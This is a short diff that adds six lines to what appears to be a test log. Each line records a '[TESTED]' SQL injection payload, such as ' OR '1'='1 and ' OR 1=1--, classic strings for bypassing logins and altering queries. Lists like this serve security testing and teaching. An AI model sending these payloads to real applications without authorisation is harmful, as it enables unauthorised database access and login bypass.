@@ -1,0 +1,6 @@
+[TESTED] Payload: '
+[TESTED] Payload: ' OR '1'='1
+[TESTED] Payload: ' OR 'a'='a
+[TESTED] Payload: " OR "1"="1
+[TESTED] Payload: ' OR 1=1--
+[TESTED] Payload: ';--
